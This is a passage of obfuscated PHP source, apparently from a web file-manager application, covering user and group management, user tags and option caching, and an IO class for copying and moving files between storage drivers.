$Œ®ºİãœ[$³†µ·ß¹[1876]] = isset($¦Á¥–‰[$³ˆ’Ò¿©]) ? $¦Á¥–‰[$³ˆ’Ò¿©] : 0; $³ˆ’Ò¿©++; $äêùæØŒ[] = $Œ®ºİãœ; } return $°ŸÓÄğ->addAll($äêùæØŒ, array(), !0); } protected function userGroupAdd($µØª™†”, $ğöò‰Ö = array()) { $ŸÜÑ·ğŸ =& $_SERVER[³·—™¤¢]; $¯ç¥…±Ù = $this->getInfoSimple($µØª™†”); if (!$¯ç¥…±Ù || empty($ğöò‰Ö)) { return !1; } $„ÈÓÏÆ¢ = array(); foreach ($ğöò‰Ö as $ÖàÔœÎÁ => $óªû‘–ú) { $„ÈÓÏÆ¢[] = array($ŸÜÑ·ğŸ[1680] => $µØª™†”, $ŸÜÑ·ğŸ[1852] => $ÖàÔœÎÁ, $ŸÜÑ·ğŸ[1956] => $óªû‘–ú, $ŸÜÑ·ğŸ[1876] => 0); } return Model($ŸÜÑ·ğŸ[1942])->addAll($„ÈÓÏÆ¢, array(), !0); } protected function userGroupRemove($¢öÌì¨, $öç¹ê) { $Ê¸ñ¦éı =& $_SERVER[³·—™¤¢]; $š‡¹¼ºâ = $this->getInfoSimple($¢öÌì¨); if (!$š‡¹¼ºâ || !$öç¹ê) { return !1; } $®áË¼Ô = array($Ê¸ñ¦éı[1671] => $¢öÌì¨, $Ê¸ñ¦éı[1940] => $öç¹ê); return Model($Ê¸ñ¦éı[1942])->where($®áË¼Ô)->delete(); } public function listData() { $ç›Ñø±Š = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ç›Ñø±Š[$_SERVER[³·—™¤¢][369]]); return $ç›Ñø±Š; } public function listByID($œß‹Îşæ) { $ĞºüÔ§½ =& $_SERVER[³·—™¤¢]; if (!$œß‹Îşæ) { return; } $Ê™éÌ•µ = array($ĞºüÔ§½[1680] => array($ĞºüÔ§½[7], $œß‹Îşæ)); $£åáªõˆ = $this->where($Ê™éÌ•µ)->select(); $£åáªõˆ = array_sort_keep($£åáªõˆ, $ĞºüÔ§½[1680], $œß‹Îşæ); $this->_listDataApply($£åáªõˆ); return $£åáªõˆ; } public function listByGroup($ô¿öğš˜ = 0, $Í‘Üã÷— = array()) { $ú†Å…Ó =& $_SERVER[³·—™¤¢]; $‘‡ç½ı = $ú†Å…Ó[12]; $óÙª€³Ã = array(); if ($ô¿öğš˜) { $óÙª€³Ã = array($ú†Å…Ó[2330] => intval($ô¿öğš˜)); $‘‡ç½ı = "\x4c\x45\x46\x54\40\x4a\117\111\x4e\40{$this->tablePrefix}\x75\x73\x65\162\137\147\x72\x6f\x75\160\40\x75\163\145\x72\x5f\x67\x72\x6f\x75\160\x20\157\156\40\165\x73\145\162\x2e\x75\163\x65\x72\111\104\x20\x3d\x20\165\163\145\162\x5f\x67\x72\157\x75\160\56\x75\x73\x65\162\111\x44"; $¤Ã¶â„— = Input::get($ú†Å…Ó[457], null, $ú†Å…Ó[12]) ? $ú†Å…Ó[12] : $ú†Å…Ó[2331]; } if (isset($Í‘Üã÷—[$ú†Å…Ó[770]])) { $óÙª€³Ã[$ú†Å…Ó[2332]] = $Í‘Üã÷—[$ú†Å…Ó[770]]; } $Å¤°×¤ = $this->_makeOrder($¤Ã¶â„—)->field($ú†Å…Ó[2333])->where($óÙª€³Ã)->join($‘‡ç½ı)->selectPage(50); $this->_listDataApply($Å¤°×¤[$ú†Å…Ó[369]]); return $Å¤°×¤; } private function _makeOrder($¶çñ‰×â = '') { $±»ƒ£¦ü =& $_SERVER[³·—™¤¢]; $Ê¡ïñÉ = array($±»ƒ£¦ü[1680], $±»ƒ£¦ü[32], $±»ƒ£¦ü[1841], $±»ƒ£¦ü[1813], $±»ƒ£¦ü[200]); $ÀŒ²ƒ®ã = array($±»ƒ£¦ü[450] => $±»ƒ£¦ü[451], $±»ƒ£¦ü[452] => $±»ƒ£¦ü[453]); $¦ßÛãê = Input::get($±»ƒ£¦ü[457], $±»ƒ£¦ü[7], $±»ƒ£¦ü[1671], $Ê¡ïñÉ); $µ´ú¸µì = Input::get($±»ƒ£¦ü[458], $±»ƒ£¦ü[7], $±»ƒ£¦ü[1943], array($±»ƒ£¦ü[1943], $±»ƒ£¦ü[452])); $µ´ú¸µì = $ÀŒ²ƒ®ã[$µ´ú¸µì]; $¶çñ‰×â = $¶çñ‰×â . "\x75\163\x65\162\56{$¦ßÛãê}\40{$µ´ú¸µì}\54\40\x75\x73\x65\x72\56\165\x73\145\x72\111\x44\x20\x61\x73\x63"; return $this->alias($±»ƒ£¦ü[2065])->order($¶çñ‰×â); } public function listSearch($˜úØ‹ß) { $§¸ôá =& $_SERVER[³·—™¤¢]; $¥óøˆìˆ = $˜úØ‹ß[$§¸ôá[1946]]; $Ş”Øı  = isset($˜úØ‹ß[$§¸ôá[1947]]) ? $˜úØ‹ß[$§¸ôá[1947]] : !1; $¥óøˆìˆ = str_replace($§¸ôá[1948], $§¸ôá[1949], trim($¥óøˆìˆ)); $áç•õÒ = array($§¸ôá[32] => array($§¸ôá[383], "\45{$¥óøˆìˆ}\x25"), $§¸ôá[305] => array($§¸ôá[383], "{$¥óøˆìˆ}\45"), $§¸ôá[542] => array($§¸ôá[383], "{$¥óøˆìˆ}\x25"), $§¸ôá[1023] => $§¸ôá[1950]); if (Input::check($¥óøˆìˆ, $§¸ôá[311])) { $áç•õÒ[$§¸ôá[1680]] = array($§¸ôá[383], "{$¥óøˆìˆ}\45"); $áç•õÒ[$§¸ôá[2315]] = array($§¸ôá[383], "{$¥óøˆìˆ}\45"); } if (!$¥óøˆìˆ) { $áç•õÒ = array(); } if (isset($˜úØ‹ß[$§¸ôá[770]])) { $áç•õÒ[$§¸ôá[770]] = $˜úØ‹ß[$§¸ôá[770]]; } $áç•õÒ = $this->parseWhereLike($áç•õÒ); $û€ÆôìÇ = $this->_makeOrder()->where($áç•õÒ)->selectPage(20); if (!$û€ÆôìÇ || count($û€ÆôìÇ[$§¸ôá[369]]) < 5 && Input::check($¥óøˆìˆ, $§¸ôá[318])) { $®çğòå = $this->_searchFromMeta($§¸ôá[464], $¥óøˆìˆ, 10); $Ì¥÷¦º‰ = $this->_searchFromMeta($§¸ôá[465], $¥óøˆìˆ, 10); $Ğ©–Ñì´ = array_merge($®çğòå, $Ì¥÷¦º‰, $û€ÆôìÇ[$§¸ôá[369]]); $û€ÆôìÇ[$§¸ôá[369]] = array_unique_by_key($Ğ©–Ñì´, $§¸ôá[1680]); $û€ÆôìÇ[$§¸ôá[366]][$§¸ôá[367]] = count($û€ÆôìÇ[$§¸ôá[369]]); $û€ÆôìÇ[$§¸ôá[366]][$§¸ôá[368]] = ceil($û€ÆôìÇ[$§¸ôá[366]][$§¸ôá[367]] / $û€ÆôìÇ[$§¸ôá[366]][$§¸ôá[363]]); } $this->_listDataApply($û€ÆôìÇ[$§¸ôá[369]]); $this->_filterByGroup($û€ÆôìÇ, $Ş”Øı ); return $û€ÆôìÇ; } private function _filterByGroup(&$•÷•½Š•, $ğ³²Å¡¸) { $„Î‰¿öÂ =& $_SERVER[³·—™¤¢]; if (!$ğ³²Å¡¸) { return $•÷•½Š•; } foreach ($•÷•½Š•[$„Î‰¿öÂ[369]] as $Ş™¯«¾Ù => &$šºéï®) { $É‰•üßì = array_to_keyvalue($šºéï®[$„Î‰¿öÂ[2035]], $„Î‰¿öÂ[12], $„Î‰¿öÂ[1852]); if (!in_array($ğ³²Å¡¸, $É‰•üßì)) { unset($•÷•½Š•[$„Î‰¿öÂ[369]][$Ş™¯«¾Ù]); } } unset($šºéï®); $•÷•½Š•[$„Î‰¿öÂ[369]] = array_values($•÷•½Š•[$„Î‰¿öÂ[369]]); $•÷•½Š•[$„Î‰¿öÂ[366]] = array($„Î‰¿öÂ[2099] => count($•÷•½Š•[$„Î‰¿öÂ[369]]), $„Î‰¿öÂ[2097] => $•÷•½Š•[$„Î‰¿öÂ[366]][$„Î‰¿öÂ[363]], $„Î‰¿öÂ[2096] => 1, $„Î‰¿öÂ[2098] => 1); } private function _searchFromMeta($¶‚¾Îİ·, $õıŒ†œÕ, $İÊöı±) { $òÃèß¯Á =& $_SERVER[³·—™¤¢]; $õıŒ†œÕ = strtolower($õıŒ†œÕ); $¤ê×å¤Ş = array($òÃèß¯Á[94] => $¶‚¾Îİ·, $òÃèß¯Á[374] => array($òÃèß¯Á[383], "\x25{$õıŒ†œÕ}\x25")); $¤ê×å¤Ş = $this->parseWhereLike($¤ê×å¤Ş); $ĞèØ§“õ = Model($òÃèß¯Á[2334])->where($¤ê×å¤Ş)->limit($İÊöı±)->select(); if (!$ĞèØ§“õ) { return array(); } $ĞèØ§“õ = array_to_keyvalue($ĞèØ§“õ, $òÃèß¯Á[12], $òÃèß¯Á[1680]); $œ›¦š·ø = $this->where(array($òÃèß¯Á[1671] => array($òÃèß¯Á[7], $ĞèØ§“õ)))->select(); if (!$œ›¦š·ø) { return array(); } return $œ›¦š·ø; } private function _listDataApplyItem($³¢şØ°¥) { $ÍˆìûŠı = array($³¢şØ°¥); $this->_listDataApply($ÍˆìûŠı); return $ÍˆìûŠı[0]; } private function _listDataApply(&$Â×“î„ƒ) { $İà÷×Ó– =& $_SERVER[³·—™¤¢]; if (!$Â×“î„ƒ) { return; } array_remove_key($Â×“î„ƒ, $İà÷×Ó–[909]); $µğ¦·ÕÏ = array_to_keyvalue($Â×“î„ƒ, $İà÷×Ó–[12], $İà÷×Ó–[1680]); $this->_listAppendGroup($Â×“î„ƒ, $µğ¦·ÕÏ); $this->_listAppendMeta($Â×“î„ƒ, $µğ¦·ÕÏ); $this->_listAppendSourceRoot($Â×“î„ƒ, $µğ¦·ÕÏ); } private function _listAppendSourceRoot(&$¨¢”ÈÜÒ, $™­úö“Ğ) { $œÔûÖë =& $_SERVER[³·—™¤¢]; $’Âöˆ¯ñ = Model($œÔûÖë[845])->listSourceRoot(SourceModel::TYPE_USER, $™­úö“Ğ); $’Âöˆ¯ñ = array_to_keyvalue($’Âöˆ¯ñ, $œÔûÖë[505]); $’Âöˆ¯ñ = array_remove_key($’Âöˆ¯ñ, $œÔûÖë[505]); foreach ($¨¢”ÈÜÒ as &$Öî°Õã) { $Öî°Õã[$œÔûÖë[86]] = $’Âöˆ¯ñ[$Öî°Õã[$œÔûÖë[1680]]] ? $’Âöˆ¯ñ[$Öî°Õã[$œÔûÖë[1680]]] : array(); } unset($Öî°Õã); } private function _listAppendGroup(&$Ö¾ì¹ì, $¯ÂŠî¯Á) { $÷•”îÍ… =& $_SERVER[³·—™¤¢]; $¶İØêé° = array($÷•”îÍ…[1680] => array($÷•”îÍ…[7], $¯ÂŠî¯Á)); $…”ÚÚÓ¯ = Model($÷•”îÍ…[1942])->where($¶İØêé°)->select(); $ÑğßÍæó = array_to_keyvalue($…”ÚÚÓ¯, $÷•”îÍ…[12], $÷•”îÍ…[1852]); $ÑğßÍæó = array_remove_value(array_unique($ÑğßÍæó), $÷•”îÍ…[197]); if (!$ÑğßÍæó || !$…”ÚÚÓ¯) { return; } $¶İØêé° = array($÷•”îÍ…[1852] => array($÷•”îÍ…[7], $ÑğßÍæó)); $Òıàª¨À = Model($÷•”îÍ…[2033])->field($÷•”îÍ…[2335])->where($¶İØêé°)->select(); $Òıàª¨À = array_to_keyvalue($Òıàª¨À, $÷•”îÍ…[1852]); $…”ÚÚÓ¯ = array_to_keyvalue_group($…”ÚÚÓ¯, $÷•”îÍ…[1680]); foreach ($…”ÚÚÓ¯ as &$´Åº±ùÉ) { $õö¹ÆÍ = array(); foreach ($´Åº±ùÉ as $ˆı—€¾š) { if (!$ˆı—€¾š[$÷•”îÍ…[1956]]) { continue; } $®æ¿”³Ú = Model($÷•”îÍ…[507])->listData($ˆı—€¾š[$÷•”îÍ…[1956]]); $õö¹ÆÍ[] = array($÷•”îÍ…[1852] => $ˆı—€¾š[$÷•”îÍ…[1852]], $÷•”îÍ…[2336] => $Òıàª¨À[$ˆı—€¾š[$÷•”îÍ…[1852]]][$÷•”îÍ…[32]], $÷•”îÍ…[521] => $Òıàª¨À[$ˆı—€¾š[$÷•”îÍ…[1852]]][$÷•”îÍ…[521]], $÷•”îÍ…[413] => $®æ¿”³Ú); } $´Åº±ùÉ = $õö¹ÆÍ; } unset($´Åº±ùÉ); foreach ($Ö¾ì¹ì as &$ˆì†¡––) { $ˆì†¡––[$÷•”îÍ…[2035]] = array(); if (isset($…”ÚÚÓ¯[$ˆì†¡––[$÷•”îÍ…[1680]]])) { $ˆì†¡––[$÷•”îÍ…[2035]] = $…”ÚÚÓ¯[$ˆì†¡––[$÷•”îÍ…[1680]]]; } } unset($ˆì†¡––); } public function userAppendGroup($˜˜­¥‘°) { $Ï“Êƒ°Ÿ =& $_SERVER[³·—™¤¢]; if (!$˜˜­¥‘°) { return array(); } $this->_listAppendGroup($˜˜­¥‘°, array_to_keyvalue($˜˜­¥‘°, $Ï“Êƒ°Ÿ[12], $Ï“Êƒ°Ÿ[1680])); return $˜˜­¥‘°; } private function _listAppendMeta(&$êàíÖ’, $®ÙåÙ‡›) { $û¯°½†² =& $_SERVER[³·—™¤¢]; $ëö ĞÊÂ = UserJobModel::JOB_KEY; $ŞÏá´ü = array($û¯°½†²[2316]); $ÏæÌ±õò = array($û¯°½†²[1680] => array($û¯°½†²[7], $®ÙåÙ‡›)); $ àÎìÛˆ = Model($û¯°½†²[2314])->where($ÏæÌ±õò)->select(); $ àÎìÛˆ = array_to_keyvalue_group($ àÎìÛˆ, $û¯°½†²[1680]); foreach ($ àÎìÛˆ as &$«¼Ç€Şó) { $ŠŞÓ×ê× = array(); foreach ($«¼Ç€Şó as $¬‚ÁÅ¸) { if (!in_array($¬‚ÁÅ¸[$û¯°½†²[94]], $ŞÏá´ü)) { $ŠŞÓ×ê×[$¬‚ÁÅ¸[$û¯°½†²[94]]] = $¬‚ÁÅ¸[$û¯°½†²[374]]; } } $«¼Ç€Şó = $ŠŞÓ×ê×; } unset($«¼Ç€Şó); $¥µà°Å = Model($û¯°½†²[2337]); foreach ($êàíÖ’ as &$°¤¤Ÿã) { $†ê¹•½û = array(); if (isset($ àÎìÛˆ[$°¤¤Ÿã[$û¯°½†²[1680]]])) { $†ê¹•½û = $ àÎìÛˆ[$°¤¤Ÿã[$û¯°½†²[1680]]]; } $°¤¤Ÿã[$û¯°½†²[2338]] = array(); if (isset($†ê¹•½û[$ëö ĞÊÂ])) { $°¤¤Ÿã[$û¯°½†²[2338]] = $¥µà°Å->getUserJobInfo($†ê¹•½û[$ëö ĞÊÂ]); } } unset($°¤¤Ÿã); } protected function groupUserAll($éŠçğÇ‡) { $ëÜŞÕƒŞ =& $_SERVER[³·—™¤¢]; if (!$éŠçğÇ‡) { return !1; } $¾¨©Êè˜ = Model($ëÜŞÕƒŞ[1942])->field($ëÜŞÕƒŞ[1680])->where(array($ëÜŞÕƒŞ[1852] => array($ëÜŞÕƒŞ[7], $éŠçğÇ‡)))->select(); $¾¨©Êè˜ = array_to_keyvalue($¾¨©Êè˜, $ëÜŞÕƒŞ[12], $ëÜŞÕƒŞ[1680]); return array_unique($¾¨©Êè˜); } public function userSearch($î· ¢—, $Ú•€•°Ö = "\x2a") { return Model($_SERVER[³·—™¤¢][535])->where($î· ¢—)->field($Ú•€•°Ö)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\157\x70\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($”Ñ‡±Ãâ) { $‚¤Úëæé =& $_SERVER[³·—™¤¢]; if (!defined($‚¤Úëæé[475])) { define($‚¤Úëæé[475], 0); } return "\x55\x73\145\x72\x4f\x70\x74\x69\x6f\x6e\137{$”Ñ‡±Ãâ}\x5f" . USER_ID; } protected function filterWhere($ãµ©ö†‚) { $¯æòã¬Š =& $_SERVER[³·—™¤¢]; if (!defined($¯æòã¬Š[475])) { define($¯æòã¬Š[475], 0); } $ãµ©ö†‚[$¯æòã¬Š[1680]] = USER_ID; return $ãµ©ö†‚; } public function cacheRemoveUser($ƒ…İµö€, $ØßñÌì¯) { return Cache::remove("\125\x73\x65\162\117\160\164\151\157\x6e\137{$ƒ…İµö€}\x5f" . $ØßñÌì¯); } protected function optionDefault($½”îÓ¥€ = '') { $’­û‡…÷ =& $_SERVER[³·—™¤¢]; if ($½”îÓ¥€ == $’­û‡…÷[12]) { return $GLOBALS[$’­û‡…÷[6]][$’­û‡…÷[2339]]; } if ($½”îÓ¥€ == $’­û‡…÷[2340]) { return $GLOBALS[$’­û‡…÷[6]][$’­û‡…÷[2341]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\56\x74\x61\147\114\151\163\164"; public $modelType = "\x55\x73\x65\x72\117\160\x74\151\x6f\156"; public $field = array("\156\141\155\x65", "\x73\164\171\x6c\x65", "\x73\x6f\x72\x74"); public function listData($µªÃ¹Ì’ = false, $¢İÓ…Şú = "\163\157\x72\164", $¶×ÕâÓ® = false) { return parent::listData($µªÃ¹Ì’, $¢İÓ…Şú, $¶×ÕâÓ®); } public function remove($¤ÔÃÈê‚) { return parent::remove($¤ÔÃÈê‚); } public function add($ù©Ë—÷È, $×ø˜çü  = "\154\x61\x62\x65\x6c\55\147\162\x65\171\x2d\156\157\x72\155\141\154") { $æ°™•ÙØ =& $_SERVER[³·—™¤¢]; if ($this->findByName($ù©Ë—÷È)) { return !1; } $²ğÛáÇ = array($æ°™•ÙØ[420] => $ù©Ë—÷È, $æ°™•ÙØ[485] => $×ø˜çü , $æ°™•ÙØ[1856] => $this->getSort($æ°™•ÙØ[258]) + 1); return parent::insert($²ğÛáÇ); } public function update($Å­ÖåÉ, $¿¬‡ëñ¢) { $“òÃ¶‡¬ =& $_SERVER[³·—™¤¢]; $Ê‰ä¥¹È = $this->listData($Å­ÖåÉ); $øåı¯ÌŸ = $this->findByName($¿¬‡ëñ¢[$“òÃ¶‡¬[32]]); if (!$Ê‰ä¥¹È || $øåı¯ÌŸ && $øåı¯ÌŸ[$“òÃ¶‡¬[399]] != $Ê‰ä¥¹È[$“òÃ¶‡¬[399]]) { return !1; } return parent::update($Å­ÖåÉ, $¿¬‡ëñ¢); } public function moveTop($Óğüëñƒ) { $†’¬¯º =& $_SERVER[³·—™¤¢]; $Î­Â‘˜ = parent::listData(); $ùùÅ¦Çë = $this->getSort($†’¬¯º[257]); foreach ($Î­Â‘˜ as &$©æÂëŸ) { if ($©æÂëŸ[$†’¬¯º[399]] == $Óğüëñƒ) { $©æÂëŸ[$†’¬¯º[1876]] = $ùùÅ¦Çë; continue; } $©æÂëŸ[$†’¬¯º[1876]] += 1; } unset($©æÂëŸ); return parent::resetData($Î­Â‘˜); } public function moveBottom($‹‰ƒ€³Í) { $Ò±‡øØ =& $_SERVER[³·—™¤¢]; $ÀÍÉšš = $this->getSort($Ò±‡øØ[258]) + 1; return parent::update($‹‰ƒ€³Í, array($Ò±‡øØ[1876] => $ÀÍÉšš)); } public function resetSort($î¼ÎÂ¤) { $¼ÈÒ…ã‚ =& $_SERVER[³·—™¤¢]; $ßÀÁ¼ = array(); $î¼ÎÂ¤ = is_array($î¼ÎÂ¤) ? $î¼ÎÂ¤ : array(); for ($‡Òƒ×Áû = 0; $‡Òƒ×Áû < count($î¼ÎÂ¤); $‡Òƒ×Áû++) { $ßÀÁ¼[$î¼ÎÂ¤[$‡Òƒ×Áû] . $¼ÈÒ…ã‚[12]] = $‡Òƒ×Áû + 1; } $‘æ¾ÎÓé = parent::listData(); foreach ($‘æ¾ÎÓé as &$œÔÖÂœà) { $ÁËÂÔ¥ = $ßÀÁ¼[$œÔÖÂœà[$¼ÈÒ…ã‚[399]]]; $œÔÖÂœà[$¼ÈÒ…ã‚[1876]] = $ÁËÂÔ¥ ? $ÁËÂÔ¥ : $œÔÖÂœà[$¼ÈÒ…ã‚[1876]]; } unset($œÔÖÂœà); return parent::resetData($‘æ¾ÎÓé); } private function getSort($ñ¬…³²ş) { $Î€½…ş¾ =& $_SERVER[³·—™¤¢]; $ÕÈ½©™ß = parent::listData(); $çùÄ°Ÿ¼ = array_to_keyvalue($ÕÈ½©™ß, $Î€½…ş¾[12], $Î€½…ş¾[1876]); if (!$çùÄ°Ÿ¼) { $çùÄ°Ÿ¼ = array(0); } $ëËÇ´œ¤ = $ñ¬…³²ş == $Î€½…ş¾[258] ? max($çùÄ°Ÿ¼) : min($çùÄ°Ÿ¼); return intval($ëËÇ´œ¤); } } goto C¢¨¨ÌåªÜ; EĞìÚŒ¸Ú¶: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Üô¬¹Ö, $Œ£Ñ‹ÍÂ) { $´§ŞÖ =& $_SERVER[³·—™¤¢]; $´¹ªÜå„ = $Œ£Ñ‹ÍÂ; $GLOBALS[$´§ŞÖ[1169]] = $´§ŞÖ[1170] . $Üô¬¹Ö; Hook::trigger($´§ŞÖ[1170] . $Üô¬¹Ö . $´§ŞÖ[1171], $´¹ªÜå„); $éğ¢•¦€ = self::driverMake($Œ£Ñ‹ÍÂ[0]); if (!$éğ¢•¦€) { return !1; } if (method_exists($éğ¢•¦€, $Üô¬¹Ö)) { $¯Ê—® = @call_user_func_array(array($éğ¢•¦€, $Üô¬¹Ö), $Œ£Ñ‹ÍÂ); } else { if (method_exists($éğ¢•¦€, $´§ŞÖ[1172])) { $¯Ê—® = @call_user_func_array(array($éğ¢•¦€, $Üô¬¹Ö), $Œ£Ñ‹ÍÂ); } else { if (method_exists(self, $Üô¬¹Ö)) { $¯Ê—® = @call_user_func_array(array(self, $Üô¬¹Ö), $Œ£Ñ‹ÍÂ); } else { $¯Ê—® = call_user_func_array(array(parent, $Üô¬¹Ö), $Œ£Ñ‹ÍÂ); } } } Hook::trigger($´§ŞÖ[1170] . $Üô¬¹Ö . $´§ŞÖ[1173], $´¹ªÜå„, $¯Ê—®); return $¯Ê—®; } public static function init($Ø¨ì¸Ï) { return self::driverMake($Ø¨ì¸Ï); } public static function copy($ÙÁñ¥¸©, $’×êË², $ê¼Š×—ª = false, $¸©ŞßªÚ = false) { return self::copyMoveStart($ÙÁñ¥¸©, $’×êË², $ê¼Š×—ª, $_SERVER[³·—™¤¢][555], $¸©ŞßªÚ); } public static function move($ì‡ƒš®ò, $½Â×ˆÔŠ, $¶èÉâ = false, $ÑŠŸ„ˆ» = false) { return self::copyMoveStart($ì‡ƒš®ò, $½Â×ˆÔŠ, $¶èÉâ, $_SERVER[³·—™¤¢][557], $ÑŠŸ„ˆ»); } private static function copyMoveStart($ä¬Í›Éí, $ñÛèªş», $ÚÛØğ“û, $ÍÎøêŸ™, $Œ™İµá¶) { $àÅŞÙøñ =& $_SERVER[³·—™¤¢]; $úİëü€ú = array($ä¬Í›Éí, $ñÛèªş», $ÚÛØğ“û, $Œ™İµá¶); Hook::trigger($àÅŞÙøñ[1170] . $ÍÎøêŸ™ . $àÅŞÙøñ[1171], $úİëü€ú); $ñ¥Ä¼Ù = self::copyMove($ä¬Í›Éí, $ñÛèªş», $ÚÛØğ“û, $ÍÎøêŸ™, $Œ™İµá¶); Hook::trigger($àÅŞÙøñ[1170] . $ÍÎøêŸ™ . $àÅŞÙøñ[1173], $úİëü€ú, $ñ¥Ä¼Ù); return $ñ¥Ä¼Ù; } public static function saveFile($Şì°’ƒÊ, $öéÊ’ç, $ë­¢¼ç = true) { $¿ É¾Å =& $_SERVER[³·—™¤¢]; $ÏöõŸ¯¢ = self::info($öéÊ’ç); $Ãé”ïñÕ = self::driverMake($Şì°’ƒÊ); $½´ºôğ = self::driverMake($öéÊ’ç); $Ğàı©ÕÕ = !1; if ($½´ºôğ->pathParse[$¿ É¾Å[1174]]) { $Ğàı©ÕÕ = $½´ºôğ; $”””ø¼¦ = $½´ºôğ->pathParse[$¿ É¾Å[1174]]; $½´ºôğ = self::driverMake($”””ø¼¦); } if ($Ãé”ïñÕ->pathParse[$¿ É¾Å[1174]]) { $ŞàËâ¾¥ = $Ãé”ïñÕ->pathParse[$¿ É¾Å[1174]]; $Ãé”ïñÕ = self::driverMake($ŞàËâ¾¥); } $±¾÷¤Ç = $½´ºôğ->pathFather($öéÊ’ç); $ÚÕúÇé = !0; if (!$ë­¢¼ç && self::driverIsSame($Ãé”ïñÕ, $½´ºôğ)) { $ÚÕúÇé = !1; } $Âñ÷ØÛÃ = self::copyFile($Ãé”ïñÕ, $Şì°’ƒÊ, $½´ºôğ, $±¾÷¤Ç, $ÏöõŸ¯¢[$¿ É¾Å[32]], $ÚÕúÇé); if ($Ğàı©ÕÕ) { $Âñ÷ØÛÃ = $Ğàı©ÕÕ->getPathOuter($Âñ÷ØÛÃ); } return $Âñ÷ØÛÃ; } private static function copyMove($ŠïÎ†ß¶, $ñ‹àù, $ê‹„ÓÁ½, $Ÿ†õò, $¦‚ãßÌ¸ = false) { $Â‘Ôğı =& $_SERVER[³·—™¤¢]; if (!$ŠïÎ†ß¶ || $ŠïÎ†ß¶ == $Â‘Ôğı[8] || !$ñ‹àù) { return !1; } ignore_timeout(); $ªƒÎ¬Ç = self::driverMake($ŠïÎ†ß¶); $Ñ§åÉõá = self::driverMake($ñ‹àù); $‘¾²Ìâ = $Ÿ†õò == $Â‘Ôğı[557]; $¡˜øƒ² = !1; if ($Ñ§åÉõá->pathParse[$Â‘Ôğı[1174]]) { $¡˜øƒ² = $Ñ§åÉõá; $ñ‹àù = $Ñ§åÉõá->pathParse[$Â‘Ôğı[1174]]; $Ñ§åÉõá = self::driverMake($ñ‹àù); } if ($ªƒÎ¬Ç->pathParse[$Â‘Ôğı[1174]]) { $ŠïÎ†ß¶ = $ªƒÎ¬Ç->pathParse[$Â‘Ôğı[1174]]; $ªƒÎ¬Ç = self::driverMake($ŠïÎ†ß¶); } self::check($ªƒÎ¬Ç, $ŠïÎ†ß¶, $Ñ§åÉõá, $ñ‹àù); Hook::trigger($Â‘Ôğı[1175], $ªƒÎ¬Ç, $ŠïÎ†ß¶, $Ñ§åÉõá, $ñ‹àù); $Û ÆéÂ½ = self::driverIsSame($ªƒÎ¬Ç, $Ñ§åÉõá); if ($Û ÆéÂ½) { if ($Ÿ†õò == $Â‘Ôğı[557] && !method_exists($Ñ§åÉõá, $Â‘Ôğı[1176]) && trim($ñ‹àù, $Â‘Ôğı[8]) == trim($Ñ§åÉõá->pathFather($ŠïÎ†ß¶), $Â‘Ôğı[8])) { if ($ªƒÎ¬Ç->pathThis($ŠïÎ†ß¶) != $¦‚ãßÌ¸ && !$ªƒÎ¬Ç->isTypeObject()) { return $ªƒÎ¬Ç->rename($ŠïÎ†ß¶, $¦‚ãßÌ¸); } return $Ñ§åÉõá->getPathOuter($ŠïÎ†ß¶); } if (method_exists($Ñ§åÉõá, $Ÿ†õò)) { return $Ñ§åÉõá->{$Ÿ†õò}($ŠïÎ†ß¶, $ñ‹àù, $ê‹„ÓÁ½, $¦‚ãßÌ¸); } } if ($Û ÆéÂ½ && $Ÿ†õò == $Â‘Ôğı[557] && $Ñ§åÉõá->getType() == $Â‘Ôğı[106]) { $ÊóŸ»‘Ÿ = $Ñ§åÉõá->movePath($ŠïÎ†ß¶, $ñ‹àù, $¦‚ãßÌ¸); if ($ÊóŸ»‘Ÿ) { return $ÊóŸ»‘Ÿ; } } $èö¸åèĞ = $ªƒÎ¬Ç->isFile($ŠïÎ†ß¶); if (!$èö¸åèĞ && $Ñ§åÉõá->getType() == $Â‘Ôğı[778] && $ªƒÎ¬Ç->getType() == $Â‘Ôğı[106]) { $ÊóŸ»‘Ÿ = $Ñ§åÉõá->copyFolderFromIO($ªƒÎ¬Ç, $ŠïÎ†ß¶, $ñ‹àù, $ê‹„ÓÁ½, $‘¾²Ìâ, $¦‚ãßÌ¸); } else { $ÊóŸ»‘Ÿ = self::copyPath($ªƒÎ¬Ç, $ŠïÎ†ß¶, $Ñ§åÉõá, $ñ‹àù, $ê‹„ÓÁ½, $‘¾²Ìâ, $èö¸åèĞ, $¦‚ãßÌ¸); } if ($ÊóŸ»‘Ÿ && $‘¾²Ìâ) { $ªƒÎ¬Ç->remove($ŠïÎ†ß¶); } if ($¡˜øƒ²) { $ÊóŸ»‘Ÿ = $¡˜øƒ²->getPathOuter($ÊóŸ»‘Ÿ); } return $ÊóŸ»‘Ÿ; } private static function check($Êâ‘ºÁÔ, $É¸ĞÅì‘, $©‚²Ñ•Ö, &$›°åÎ±) { $‰şŠèğ› =& $_SERVER[³·—™¤¢]; if (self::driverIsSame($Êâ‘ºÁÔ, $©‚²Ñ•Ö) && $Êâ‘ºÁÔ->isFolder($É¸ĞÅì‘) && $Êâ‘ºÁÔ->isParentOf($É¸ĞÅì‘, $›°åÎ±)) { show_json(LNG($‰şŠèğ›[1177]), !1); } if (!$Êâ‘ºÁÔ->exist($É¸ĞÅì‘)) { show_json(LNG($‰şŠèğ›[105]), !1); } } private static function copyPath($Üˆµ°ì¼, $«€›½­›, $†ô‡“ ‹, $›êí€øÛ, $”ú»ØÜ¬, $ŠİÕó‰¡, $ºÉÑ…áÃ, $Ê ‡‚“ç = false, $½ö¤Š = true) { $ÅÈªú¬ä =& $_SERVER[³·—™¤¢]; $î–¤Êö¿ = empty($Ê ‡‚“ç) && $Ê ‡‚“ç !== $ÅÈªú¬ä[197] ? $Üˆµ°ì¼->pathThis($«€›½­›) : $Ê ‡‚“ç; if ($”ú»ØÜ¬) { $ëä²ÒàÇ = $†ô‡“ ‹->fileNameExist($›êí€øÛ, $î–¤Êö¿); $·Áò‚ = $î–¤Êö¿; $î–¤Êö¿ = $†ô‡“ ‹->fileNameAuto($›êí€øÛ, $î–¤Êö¿, $”ú»ØÜ¬, !$ºÉÑ…áÃ); if (!$ëä²ÒàÇ || 